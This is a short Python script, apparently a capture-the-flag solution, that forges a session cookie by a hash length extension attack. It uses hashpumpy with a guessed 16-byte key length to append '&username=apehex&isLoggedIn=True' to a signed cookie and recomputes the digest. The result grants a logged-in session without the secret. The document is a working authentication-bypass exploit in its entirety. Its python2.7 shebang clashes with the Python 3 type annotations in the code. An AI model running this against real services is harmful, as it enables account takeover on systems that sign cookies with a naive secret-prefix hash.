#!/usr/bin/env python2.7

import sys
from base64 import b64decode, b64encode
from hashpumpy import hashpump

KEY_LENGTH = 16
OVERWRITE= '&username=apehex&isLoggedIn=True'

def swole(cookie: str, append: str=OVERWRITE) -> str:
    try:
        # parse the original cookie
        _input, _digest = cookie.split('.')
        # extend the digest with parameter overwrites
        _new_digest, _new_input = hashpump(
            b64decode(_digest).decode('utf-8'),
            b64decode(_input).decode('utf-8'),
            append,
            KEY_LENGTH)
        # format the results as a new cookie
        return b64encode(_new_input) + b'.' + b64encode(bytes(_new_digest, 'utf-8'))
    except:
        return 'Error: the input cookie does\'t match the expected format'

if __name__ == "__main__" and len(sys.argv) > 1:
    print(swole(sys.argv[1]))
